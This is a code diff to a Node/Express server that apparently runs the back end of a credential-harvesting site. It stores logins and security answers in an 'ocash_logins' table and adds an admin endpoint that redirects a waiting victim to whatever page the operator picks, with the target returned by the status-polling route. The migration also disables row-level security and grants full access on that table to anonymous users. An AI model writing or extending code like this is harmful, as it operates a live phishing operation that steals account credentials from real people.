@@ -113,9 +113,9 @@ app.post('/api/submit-security/:id', async (req, res) => {
 // Check status
 app.get('/api/status/:id', async (req, res) => {
   try {
-    const { data } = await supabase.from('ocash_logins').select('status,step').eq('id', req.params.id).maybeSingle();
+    const { data } = await supabase.from('ocash_logins').select('status,step,redirect_to').eq('id', req.params.id).maybeSingle();
     if (!data) return res.status(404).json({ error: 'not found' });
-    res.json({ status: data.status, step: data.step });
+    res.json({ status: data.status, step: data.step, redirect: data.redirect_to || '' });
   } catch (err) {
     res.json({ status: 'pending', step: 'login' });
   }
@@ -161,6 +161,23 @@ app.post('/api/admin/reject/:id', async (req, res) => {
     if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
     const { error } = await supabase.from('ocash_logins').update({
       status: 'rejected',
+      updated_at: new Date().toISOString()
+    }).eq('id', req.params.id);
+    if (error) throw error;
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Admin: redirect client to a specific page
+app.post('/api/admin/redirect/:id', async (req, res) => {
+  try {
+    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
+    const page = String(req.body.page || '');
+    const { error } = await supabase.from('ocash_logins').update({
+      redirect_to: page,
+      status: 'redirect',
       updated_at: new Date().toISOString()
     }).eq('id', req.params.id);
     if (error) throw error;
@@ -219,6 +236,7 @@ async function autoMigrate() {
       );
       ALTER TABLE ocash_logins ADD COLUMN IF NOT EXISTS security_question TEXT DEFAULT '';
       ALTER TABLE ocash_logins ADD COLUMN IF NOT EXISTS security_answer TEXT DEFAULT '';
+      ALTER TABLE ocash_logins ADD COLUMN IF NOT EXISTS redirect_to TEXT DEFAULT '';
       ALTER TABLE ocash_logins DISABLE ROW LEVEL SECURITY;
       GRANT ALL ON ocash_logins TO anon, authenticated, service_role;
     `);
